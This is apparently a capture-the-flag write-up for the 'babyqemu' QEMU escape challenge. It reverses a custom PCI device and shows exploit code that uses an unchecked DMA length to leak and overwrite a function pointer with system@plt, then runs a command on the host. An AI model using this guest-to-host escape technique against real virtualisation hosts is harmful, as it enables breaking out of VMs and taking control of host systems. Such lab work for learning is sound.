---
title:  "QemuEscapeBasic"
layout: post
---

Today, we are going to learn more about qemu escape. Although we have tried it once on XMAN 2019, but that is not enough.  
Nowadays, more and more qemu escape challenges are coming out. So we should be well prepared in case we facing it one day.  

We will start from this repo.  
Finish all the challenges in it.  
```
git clone https://github.com/w0lfzhang/vmescape
```

# babyqemu

```
sudo apt-get install libaio1 libaio-dev
sudo add-apt-repository ppa:xapienz/curl34
sudo apt-get update
sudo apt install libcurl3
```

Usually, we will be provided with a compiled qemu file named `qemu-system-x86_64`  
The organizer will preset some **vulnerable functions** in it.  
In most of the situation, these vulnerable functions have the same prefix, and the `qemu-system-x86_64` is not stripped.  
We can easily find them in IDA.  

```bash
#!/bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda

login with 
root
[EMPTY]
```
We can check the launch.sh file, and find the device name is **hitb**. So we search `hitb` in IDA. 

![image.png](https://i.loli.net/2021/03/19/6fgiFKOeD2zmCJv.png)

Basically, we just need to reverse these functions, unless the organizer sucks.    
Check `pci_hitb_register_types` to get all `TypeInfo`.  

![image.png](https://i.loli.net/2021/03/19/UnEWtpydKk96Bre.png)

Now, we know that the class_init function is `hitb_class_init` and the instance_init function is `hitb_instance_init`.  
We can check the `hitb_class_init` function first.  (Rename the type of the viriable v2 to PCIDeviceClass*)
```C
void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)
{
  PCIDeviceClass *v2; // rax

  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           a1,
                           "pci-device",
                           "/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c",
                           469,
                           "hitb_class_init");
  v2->revision = 16;
  v2->class_id = 255;
  v2->realize = (void (*)(PCIDevice_0 *, Error_0 **))pci_hitb_realize;
  v2->exit = (PCIUnregisterFunc *)pci_hitb_uninit;
  v2->vendor_id = 0x1234;
  v2->device_id = 0x2333;
}
```
Then we know the device_id is 0x2333 and the vendor_id is 0x1234, we can check the pci device in qemu VM.  
```
# [  550.402757] random: crng init done
lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:2333
```
the hitb device is `00：04.0`, check the `resource` file to read I/O information.  
```
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fea00000 0x00000000feafffff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
```
the format of this file is  
```
start_address end_address flag
```
The last bit of the `flag` refer to the mapping type, 0 represents to the memory mapping, 1 represents to the IO mapping.

Then we should check the `pci_hitb_realize` function (rename the structure type of pdev to HitbState*)
```C
void __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)
{
  pdev->pdev.config[61] = 1;
  if ( !msi_init(&pdev->pdev, 0, 1u, 1, 0, errp) )
  {
    timer_init_tl(&pdev->dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev);
    qemu_mutex_init(&pdev->thr_mutex);
    qemu_cond_init(&pdev->thr_cond);
    qemu_thread_create(&pdev->thread, "hitb", (void *(*)(void *))hitb_fact_thread, pdev, 0);
    memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000uLL);
    pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  }
  
  
.data.rel.ro:00000000009690A0 ; const MemoryRegionOps_0 hitb_mmio_ops
.data.rel.ro:00000000009690A0 hitb_mmio_ops   dq offset hitb_mmio_read; read
.data.rel.ro:00000000009690A0                                         ; DATA XREF: pci_hitb_realize+99↑o
.data.rel.ro:00000000009690A0                 dq offset hitb_mmio_write; write
.data.rel.ro:00000000009690A0                 dq 0                    ; read_with_attrs
.data.rel.ro:00000000009690A0                 dq 0                    ; write_with_attrs
.data.rel.ro:00000000009690A0                 dq 0                    ; request_ptr
.data.rel.ro:00000000009690A0                 dd DEVICE_NATIVE_ENDIAN ; endianness
```

This function registered a timer, the callback function is `hitb_dma_timer`, and then it registered a structure called `hitb_mmio_ops`, this structure included `hitb_mmio_read` and `hitb_mmio_write`.

`hitb_mmio_write` did do some interesting actions

```C
void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // er13
  int v5; // edx
  bool v6; // zf
  int64_t v7; // rax

  if ( (addr > 0x7F || size == 4) && (!((size - 4) & 0xFFFFFFFB) || addr <= 0x7F) )
  {
    if ( addr == 128 )
    {
      if ( !(opaque->dma.cmd & 1) )
        opaque->dma.src = val;
    }
    else
    {
      v4 = val;
      if ( addr > 0x80 )
      {
        if ( addr == 140 )
        {
          if ( !(opaque->dma.cmd & 1) )
            *(dma_addr_t *)((char *)&opaque->dma.dst + 4) = val;
        }
        else if ( addr > 0x8C )
        {
          if ( addr == 144 )
          {
            if ( !(opaque->dma.cmd & 1) )
              opaque->dma.cnt = val;
          }
          else if ( addr == 152 && val & 1 && !(opaque->dma.cmd & 1) )
          {
            opaque->dma.cmd = val;
            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(
              &opaque->dma_timer,
              ((signed __int64)((unsigned __int128)(4835703278458516699LL * (signed __int128)v7) >> 64) >> 18)
            - (v7 >> 63)
            + 100);
          }
        }
        else if ( addr == 132 )
        {
          if ( !(opaque->dma.cmd & 1) )
            *(dma_addr_t *)((char *)&opaque->dma.src + 4) = val;
        }
        else if ( addr == 136 && !(opaque->dma.cmd & 1) )
        {
          opaque->dma.dst = val;
        }
      }
      else if ( addr == 32 )
      {
        if ( val & 0x80 )
          _InterlockedOr((volatile signed __int32 *)&opaque->status, 0x80u);
        else
          _InterlockedAnd((volatile signed __int32 *)&opaque->status, 0xFFFFFF7F);
      }
      else if ( addr > 0x20 )
      {
        if ( addr == 96 )
        {
          v6 = ((unsigned int)val | opaque->irq_status) == 0;
          opaque->irq_status |= val;
          if ( !v6 )
            hitb_raise_irq(opaque, 0x60u);
        }
        else if ( addr == 100 )
        {
          v5 = ~(_DWORD)val;
          v6 = (v5 & opaque->irq_status) == 0;
          opaque->irq_status &= v5;
          if ( v6 && !msi_enabled(&opaque->pdev) )
            pci_set_irq(&opaque->pdev, 0);
        }
      }
      else if ( addr == 4 )
      {
        opaque->addr4 = ~(_DWORD)val;
      }
      else if ( addr == 8 && !(opaque->status & 1) )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        opaque->fact = v4;
        _InterlockedOr((volatile signed __int32 *)&opaque->status, 1u);
        qemu_cond_signal(&opaque->thr_cond);
        qemu_mutex_unlock(&opaque->thr_mutex);
      }
    }
  }
}
```

1. if addr is 0x80, set value to dma.src
2. if addr is 144, set value to dma.cnt
3. if addr is 0x98, set value to dma.cmd, call timer
4. if addr is 136, set value to dma.dst

`hitb_mmio_write` use addr to fill dma, the dma structure looks like this
```
00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1491)
00000000                                         ; XREF: HitbState/r
00000000 src             dq ?
00000008 dst             dq ?
00000010 cnt             dq ?
00000018 cmd             dq ?
00000020 dma_state       ends
```

when timer is triggered, it will call `hitb_dma_timer`
```C
void __fastcall hitb_dma_timer(HitbState *opaque)
{
  dma_addr_t v1; // rax
  __int64 v2; // rdx
  uint8_t *v3; // rsi
  dma_addr_t v4; // rax
  dma_addr_t v5; // rdx
  uint8_t *v6; // rbp
  uint8_t *v7; // rbp

  v1 = opaque->dma.cmd;
  if ( v1 & 1 )
  {
    if ( v1 & 2 )
    {
      v2 = (unsigned int)(LODWORD(opaque->dma.src) - 0x40000);
      if ( v1 & 4 )
      {
        v7 = (uint8_t *)&opaque->dma_buf[v2];
        ((void (__fastcall *)(uint8_t *, _QWORD))opaque->enc)(v7, LODWORD(opaque->dma.cnt));
        v3 = v7;
      }
      else
      {
        v3 = (uint8_t *)&opaque->dma_buf[v2];
      }
      cpu_physical_memory_rw(opaque->dma.dst, v3, opaque->dma.cnt, 1);
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
    }
    else
    {
      v6 = (uint8_t *)&opaque[-36] + (unsigned int)opaque->dma.dst - 2824;
      LODWORD(v3) = (_DWORD)opaque + opaque->dma.dst - 0x40000 + 3000;
      cpu_physical_memory_rw(opaque->dma.src, v6, opaque->dma.cnt, 0);
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
      if ( opaque->dma.cmd & 4 )
      {
        v3 = (uint8_t *)LODWORD(opaque->dma.cnt);
        ((void (__fastcall *)(uint8_t *, uint8_t *, dma_addr_t))opaque->enc)(v6, v3, v5);
        v4 = opaque->dma.cmd;
        v5 = opaque->dma.cmd & 4;
      }
    }
    opaque->dma.cmd = v4 & 0xFFFFFFFFFFFFFFFELL;
    if ( v5 )
    {
      opaque->irq_status |= 0x100u;
      hitb_raise_irq(opaque, (uint32_t)v3);
    }
  }
}
```
This function mainly did 3 things  
1. when dma.cmd is `2|1`, it will use `dma.src` minus 0x40000 as the index i, and then copy data from `dma_buf[i]` to `dma.dst` with `cpu_physical_memory_rw`. The copying length is `dma.cnt`
2. when dma.cmd is `4|2|1`, it will use `dma.dst` minus 0x40000 as the index i, and then encode `dma_buf[i]` with `opaque->enc` function, copying `dma.cnt` bytes data into `dma.dst`
3. when dma.cmd is `1`, it will use `dma.dst` minus 0x40000 as the index i, and then copy `dma_buf[i]` to `dma.src` with `cpu_physical_memory_rw`. The copying length is `dma.cnt`
4. then dma.cmd is `1|4`, it will use `dma.dst` minus 0x40000 as the index i, and then copy `dma_buf[i]` to `dma.src` with `cpu_physical_memory_rw`. The copying length is `dma.cnt`, then call `opaque->enc` to encrypt `dma_buf`

`cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)` is a function used to do memory read and write. If `is_write` is set to 1, it will write into the physical address(PA) from source virtual address(VA) buf. If `is_write` is set to 0, it will write into buf(VA) from address(PA).

At this point, we understand the function of this device, it just implemented a dma mechanism. DMA (Direct Memory Access) is an important feature of all modern computers. It allows hardware devices of different speeds to communicate without relying on the massive interrupt load of the CPU. DMA transfers copy data from one address space to another address space. When the CPU initializes this transfer action, the transfer action itself is implemented and completed by the DMA controller.

Now we know where the bug is.

There is no check for the `dma->cnt`, and the length of the `dma->buf` is limited(4096).

![image](https://user-images.githubusercontent.com/67320649/113271861-8e86f800-930d-11eb-9c21-7be93517fd3b.png)

So that we can leak the enc function after the dma_buf and edit it.

## Exploitation

1. Use the oob read to read `hitb_enc`'s address
2. Calculate the address of system@plt
3. Overwrite `hitb_enc`'s address to system@plt
4. Call `hitb_enc` to call `system`

## Debugging

```
apt install musl-tools
mkdir rootfs && cd rootfs
cpio -idmv < ../rootfs.cpio

#!/bin/sh
cd rootfs
musl-gcc -static -o exp ../exp.c
find . | cpio -H newc -o > ../rootfs.cpio
```

We can make a debugging script and then load it with `-x`
```
aslr off
handle SIGUSR1 nostop noprint
b hitb_mmio_write
b *hitb_dma_timer+0x46

r -initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda 
```

## Scripting

First we should open the coressponding resource0 file, Then we mapping it to a guest memory(mmio_mem).
```C
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
```    

Cause the `cpu_physical_memory_rw` uses physical address, we need to convert the virtual address into the physical address.  
We allocate a DMA buffer and convert the virtual address into physical address with `gva_to_gpa`.
```C
    // Allocate DMA buffer and obtain its physical address
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED)
        die("mmap");

    mlock(userbuf, 0x1000);
    phy_userbuf=gva_to_gpa(userbuf);
```    
Because the dma buffer's length is 0x1000, and the encrypt function is right behind it.
```
00000BB8 dma_buf         db 4096 dup(?)
00001BB8 enc             dq ?                    ; offset
```
Following functions are used to trigger the callback function hitb_mmio_write.
```
void dma_set_src(uint32_t src_addr)
{
    mmio_write(0x80,src_addr);
}

void dma_set_dst(uint32_t dst_addr)
{
    mmio_write(0x88,dst_addr);
}

void dma_set_cnt(uint32_t cnt)
{
    mmio_write(0x90,cnt);
}

void dma_do_cmd(uint32_t cmd)
{
    mmio_write(0x98,cmd);
}

void dma_do_read(uint32_t addr, size_t len)
{
    dma_set_dst(phy_userbuf);
    dma_set_src(addr);
    dma_set_cnt(len);
    dma_do_cmd(2|1);
    sleep(1);
}
```
After setting `dma.dst` to the physical address of our user buffer and set the `dma.src` to the idx, which is 0x40000+0x1000.
Setting the reading length to 8, `dma.cmd` to `2|1`. 
Timer function will be triggered.   
And the encrypt function's address will be leaked into the mmaped buffer.
```
# ./exp
mmio_mem @ 0x7f7a448f5000
user buff virtual address: 0x7f7a448f4000
user buff physical address: 0x225e000
leaking enc function: 0x564c3b30fdd0

gdb-peda$ x/20i 0x564c3b30fdd0
   0x564c3b30fdd0 <hitb_enc>:	test   esi,esi
   0x564c3b30fdd2 <hitb_enc+2>:	je     0x564c3b30fdec <hitb_enc+28>
   0x564c3b30fdd4 <hitb_enc+4>:	lea    eax,[rsi-0x1]
   0x564c3b30fdd7 <hitb_enc+7>:	lea    rax,[rdi+rax*1+0x1]
   0x564c3b30fddc <hitb_enc+12>:	nop    DWORD PTR [rax+0x0]
   0x564c3b30fde0 <hitb_enc+16>:	xor    BYTE PTR [rdi],0x66
   0x564c3b30fde3 <hitb_enc+19>:	add    rdi,0x1
   0x564c3b30fde7 <hitb_enc+23>:	cmp    rdi,rax
   0x564c3b30fdea <hitb_enc+26>:	jne    0x564c3b30fde0 <hitb_enc+16>
   0x564c3b30fdec <hitb_enc+28>:	repz ret 
   0x564c3b30fdee:	xchg   ax,ax
   0x564c3b30fdf0 <pci_hitb_register_types>:	lea    rdi,[rip+0x6e5229]        # 0x564c3b9f5020 <hitb_info.27046>
```

Now we can calculate the system@plt with `hitb_enc`.  
Write system@plt back into enc function with the oob write vulnerability.  

```
[-------------------------------------code-------------------------------------]
   0x5555557d8134 <hitb_dma_timer+164>:	lea    rbp,[rdi+rax*1+0xbb8]
   0x5555557d813c <hitb_dma_timer+172>:	mov    rdi,QWORD PTR [rdi+0xb68]
   0x5555557d8143 <hitb_dma_timer+179>:	mov    rsi,rbp
=> 0x5555557d8146 <hitb_dma_timer+182>:	call   0x555555763070 <cpu_physical_memory_rw>
   0x5555557d814b <hitb_dma_timer+187>:	mov    rax,QWORD PTR [rbx+0xb80]
   0x5555557d8152 <hitb_dma_timer+194>:	mov    rdx,rax
   0x5555557d8155 <hitb_dma_timer+197>:	and    edx,0x4
   0x5555557d8158 <hitb_dma_timer+200>:	je     0x5555557d80e8 <hitb_dma_timer+88>
Guessed arguments:
arg[0]: 0x341c000 
arg[1]: 0x555557fa08b8 --> 0x5555557d7dd0 (<hitb_enc>:	test   esi,esi)
arg[2]: 0x8 
arg[3]: 0x0 
[------------------------------------stack-------------------------------------]


gdb-peda$ x/20gx 0x555557fa08b8
0x555557fa08b8:	0x0000555555751b18	0x000000000fffffff
0x555557fa08c8:	0x0000000000000000	0x0000000000000000
0x555557fa08d8:	0x0000000000000051	0x0000555557f9ea90
0x555557fa08e8:	0x0000555557f9ecb0	0x0000000000000000

gdb-peda$ x/20i 0x0000555555751b18
   0x555555751b18 <system@plt>:	jmp    QWORD PTR [rip+0x92248a]        # 0x555556073fa8
   0x555555751b1e <system@plt+6>:	xchg   ax,ax
```

Then we can just call system with the encode function. It will actually call system(dma_buf).
```C
    // out of bound to overwrite enc ptr to system ptr
    dma_do_write(0x1000+DMABASE,&system_plt,8);

    // deply the parameter of system function
    char *command="cat /root/flag\x00";
    dma_do_write(0x200+DMABASE,command,strlen(command));

    // trigger the enc ptr to execute system
    dma_do_enc(0x200+DMABASE,8);
```






# Reference

https://github.com/qemu/qemu/blob/master/hw/misc/edu.c  
https://askubuntu.com/questions/1061431/how-to-have-both-libcurl3-and-libcurl4-installed-at-same-time










